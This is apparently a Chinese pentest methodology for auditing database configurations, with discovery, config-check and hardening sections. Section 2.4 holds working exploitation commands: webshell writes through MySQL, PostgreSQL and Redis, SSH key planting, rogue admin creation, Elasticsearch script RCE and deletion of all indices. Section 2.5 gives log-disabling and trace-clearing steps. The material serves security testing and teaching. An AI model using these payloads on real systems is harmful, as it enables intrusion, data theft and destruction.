# 数据库配置审计方法论

---

## 第一部分：文档概述

### 1.1 编写目的
为渗透测试人员提供针对数据库系统（MySQL、PostgreSQL、MongoDB、Redis 等）配置安全审计的系统性方法论。数据库配置错误是导致数据泄露的主要原因之一。

### 1.2 适用范围
- 关系型数据库：MySQL、PostgreSQL、Oracle、SQL Server
- NoSQL 数据库：MongoDB、Redis、Elasticsearch、Cassandra
- 内存数据库：Redis、Memcached
- 云数据库：RDS、Cosmos DB、Cloud SQL

### 1.3 读者对象
- 渗透测试工程师
- 数据库安全审计人员
- DBA（数据库管理员）
- 数据安全工程师

---

## 第二部分：核心渗透技术专题

### 专题：数据库配置审计

#### 2.1 技术介绍

数据库配置错误是指数据库系统在安装、部署和运维过程中的不安全配置。由于数据库存储着企业的核心数据，配置错误可能导致严重的数据泄露、篡改和丢失。

**常见数据库配置错误类型：**

| 错误类型 | 描述 | 危害等级 |
|---------|------|---------|
| **弱认证/无认证** | 空密码、默认凭证 | 严重 |
| **网络暴露** | 数据库端口对公网开放 | 严重 |
| **权限过宽** | 用户权限超出必要范围 | 高 |
| **明文传输** | 未启用 SSL/TLS 加密 | 高 |
| **审计缺失** | 未开启查询日志和审计 | 中 |
| **版本过旧** | 使用存在漏洞的版本 | 高 |

**常见数据库及默认端口：**

| 数据库 | 默认端口 | 协议 |
|-------|---------|------|
| MySQL | 3306 | TCP |
| PostgreSQL | 5432 | TCP |
| MongoDB | 27017 | TCP |
| Redis | 6379 | TCP |
| Elasticsearch | 9200/9300 | TCP |
| Oracle | 1521 | TCP |
| SQL Server | 1433 | TCP |
| Cassandra | 9042 | TCP |

#### 2.2 审计常见于哪些场景

| 场景 | 风险点描述 |
|-----|-----------|
| **新系统上线** | 使用默认配置未加固 |
| **开发环境** | 为方便测试关闭安全措施 |
| **云数据库** | 安全组配置错误 |
| **微服务架构** | 数据库连接配置分散 |
| **数据迁移** | 临时配置未恢复 |

#### 2.3 漏洞探测方法

##### 2.3.1 黑盒测试

**1. 数据库服务发现**

```bash
# 端口扫描
nmap -p 3306,5432,27017,6379 target
nmap -sV target

# 使用 Nmap 脚本检测
nmap --script mysql-info target
nmap --script mongodb-info target
nmap --script redis-info target
```

**2. 认证测试**

```bash
# MySQL 空密码测试
mysql -h target -u root

# MySQL 暴力破解
hydra -L users.txt -P passwords.txt mysql://target

# MongoDB 未授权访问
mongo target:27017

# Redis 未授权访问
redis-cli -h target
redis-cli -h target ping  # 返回 PONG 表示可连接
```

**3. 自动化扫描工具**

```bash
# MySQL 安全审计
mysqlaudit -u root -h target

# Redis 安全扫描
git clone https://github.com/n0b0dyCN/redis-rogue-getshell
python redis-rogue-getshell.py -t target

# MongoDB 安全检查
git clone https://github.com/youngyangyang04/MongoDB-Scan
python mongodb-scan.py -t target
```

##### 2.3.2 白盒测试

**1. MySQL 配置检查**

```sql
-- 检查用户权限
SELECT user, host, authentication_string FROM mysql.user;

-- 检查是否允许远程 root 登录
SELECT user, host FROM mysql.user WHERE user = 'root';

-- 检查数据库权限
SHOW GRANTS FOR 'username'@'%';

-- 检查是否启用 SSL
SHOW VARIABLES LIKE 'have_ssl';

-- 检查密码策略
SHOW VARIABLES LIKE 'validate_password%';
```

```ini
# my.cnf 安全检查
# ❌ 不安全配置
[mysqld]
skip-grant-tables
skip-networking = 0
bind-address = 0.0.0.0

# ✅ 安全配置
[mysqld]
skip-symbolic-links
local-infile = 0
bind-address = 127.0.0.1
require_secure_transport = ON
```

**2. PostgreSQL 配置检查**

```sql
-- 检查用户和权限
\du

-- 检查数据库列表
\l

-- 检查 pg_hba.conf 配置
SELECT * FROM pg_hba_rules;

-- 检查 SSL 配置
SHOW ssl;
```

```conf
# pg_hba.conf 检查
# ❌ 不安全
host    all             all             0.0.0.0/0               trust

# ✅ 安全
host    all             all             127.0.0.1/32            scram-sha-256
```

**3. MongoDB 配置检查**

```javascript
// 检查用户
use admin
db.getUsers()

// 检查角色
db.getRoles()

// 检查配置
db.serverCmdLineOpts()

// 检查 SSL
db.serverStatus().ssl
```

```yaml
# mongod.yaml 检查
# ❌ 不安全
security:
  authorization: disabled
net:
  bindIp: 0.0.0.0

# ✅ 安全
security:
  authorization: enabled
net:
  bindIp: 127.0.0.1
  tls:
    mode: requireTLS
```

**4. Redis 配置检查**

```bash
# 检查配置
redis-cli CONFIG GET *

# 重点检查项
redis-cli CONFIG GET requirepass
redis-cli CONFIG GET bind
redis-cli CONFIG GET rename-command
```

```conf
# redis.conf 检查
# ❌ 不安全
bind 0.0.0.0
protected-mode no
# 无 requirepass

# ✅ 安全
bind 127.0.0.1
protected-mode yes
requirepass StrongPassword123!
rename-command FLUSHALL ""
rename-command CONFIG ""
```

#### 2.4 漏洞利用方法

##### 2.4.1 MySQL 利用

```sql
-- 1. 读取文件
SELECT LOAD_FILE('/etc/passwd');

-- 2. 写入文件（需要 FILE 权限）
SELECT '<?php system($_GET["cmd"]); ?>' 
INTO OUTFILE '/var/www/html/shell.php';

-- 3. 执行系统命令（通过 UDF）
CREATE FUNCTION sys_exec RETURNS int SONAME 'udf.dll';
SELECT sys_exec('id');

-- 4. 提权（通过日志文件）
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/www/html/shell.php';
SELECT '<?php system($_GET["cmd"]); ?>';
```

##### 2.4.2 PostgreSQL 利用

```sql
-- 1. 读取文件
COPY pg_shadow TO '/tmp/pg_shadow.txt';

-- 2. 写入文件
COPY (SELECT '<?php system($_GET["cmd"]); ?>') 
TO '/var/www/html/shell.php';

-- 3. 执行命令（通过 COPY PROGRAM）
COPY (SELECT '') TO PROGRAM 'id';

-- 4. 创建扩展执行命令
CREATE EXTENSION IF NOT EXISTS plpython3u;
```

##### 2.4.3 MongoDB 利用

```javascript
// 1. 读取数据
use admin
db.users.find()

// 2. 导出数据
mongodump -h target -o /tmp/dump

// 3. 写入文件（需要特定配置）
db.fs.files.insertOne({
  filename: "shell.php",
  data: BinData(0, "PD9waHAgc3lzdGVt...")
})

// 4. 创建管理员用户
db.createUser({
  user: "attacker",
  pwd: "password123",
  roles: ["root"]
})
```

##### 2.4.4 Redis 利用

```bash
# 1. 读取配置
redis-cli CONFIG GET dir
redis-cli CONFIG GET dbfilename

# 2. 写入 Webshell
redis-cli -h target
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET payload "<?php system(\$_GET['cmd']); ?>"
SAVE

# 3. 写入 SSH 公钥
CONFIG SET dir /root/.ssh/
CONFIG SET dbfilename authorized_keys
SET payload "ssh-rsa AAAA..."
SAVE

# 4. 执行命令（通过 Lua 脚本）
redis-cli -h target EVAL "os.execute('id')" 0
```

##### 2.4.5 Elasticsearch 利用

```bash
# 1. 获取集群信息
curl http://target:9200/

# 2. 列出索引
curl http://target:9200/_cat/indices

# 3. 搜索敏感数据
curl http://target:9200/_search?q=password

# 4. 删除数据（破坏）
curl -X DELETE http://target:9200/_all

# 5. 执行 Groovy 脚本（旧版本）
curl -X POST http://target:9200/_search -d '{
  "script_fields": {
    "test": {
      "script": "Runtime.getRuntime().exec(\"id\")"
    }
  }
}'
```

#### 2.5 漏洞利用绕过方法

##### 2.5.1 认证绕过

| 绕过技术 | 描述 | 示例 |
|---------|------|------|
| **默认凭证** | 使用默认账号密码 | root/root |
| **暴力破解** | 字典攻击 | Hydra、Medusa |
| **SQL 注入** | 绕过 Web 应用认证 | ' OR '1'='1 |
| **配置错误** | 利用 trust 认证 | pg_hba.conf trust |

##### 2.5.2 网络限制绕过

```
# 通过 SSRF 访问内网数据库
利用 Web 应用的 SSRF 漏洞
访问 http://127.0.0.1:3306/

# 通过反向连接绕过
目标主动连接攻击者控制的数据库
```

##### 2.5.3 安全功能绕过

```
# 禁用日志
SET GLOBAL general_log = 'OFF';

# 清除审计痕迹
DROP USER 'attacker'@'%';

# 使用加密通道
使用 SSL/TLS 连接避免检测
```

---

## 第三部分：附录

### 3.1 数据库安全配置速查

| 配置项 | MySQL | PostgreSQL | MongoDB | Redis |
|-------|-------|-----------|---------|-------|
| **绑定地址** | bind-address=127.0.0.1 | listen_addresses='localhost' | bindIp: 127.0.0.1 | bind 127.0.0.1 |
| **认证** | 强密码策略 | scram-sha-256 | authorization: enabled | requirepass |
| **加密** | require_secure_transport | ssl=on | tls.mode | TLS 配置 |
| **权限** | 最小权限原则 | 角色管理 | RBAC | ACL |

### 3.2 检测工具

| 工具名称 | 用途 | 命令示例 |
|---------|------|---------|
| **Nmap** | 服务发现 | `nmap --script mysql-info` |
| **Hydra** | 暴力破解 | `hydra -L users.txt -P pass.txt mysql://target` |
| **SQLMap** | SQL 注入 | `sqlmap -u "url" --batch` |
| **Redis-Rce** | Redis 利用 | `python redis-rce.py` |
| **MongoDB-Scan** | MongoDB 扫描 | `python mongodb-scan.py` |

### 3.3 修复建议

- [ ] 修改所有默认凭证
- [ ] 限制数据库网络访问
- [ ] 启用 SSL/TLS 加密
- [ ] 实施最小权限原则
- [ ] 开启审计日志
- [ ] 定期更新和打补丁
- [ ] 备份敏感数据
- [ ] 定期安全评估
